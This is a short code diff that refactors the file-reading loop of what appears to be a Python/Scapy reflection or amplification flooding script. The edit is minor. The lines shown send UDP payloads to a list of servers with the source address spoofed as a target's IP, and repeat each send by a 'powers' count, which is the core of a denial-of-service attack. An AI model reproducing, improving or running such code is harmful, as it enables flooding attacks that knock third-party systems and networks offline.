@@ -34,9 +34,7 @@ parser.add_argument("-N", default=40, help="Number of packages")
 args = parser.parse_args()
 
 def sends(data, port):
-	ampl = open(server)
-	for servers in ampl.xreadlines(): 
-		servers = servers.rstrip('\r\n')
+	for servers in open(server, "r").read().split("\n"):
 		print(servers)
 		packet = send(IP(dst=servers, src=target)/UDP(dport=port)/Raw(load=data), count=int(powers))
 
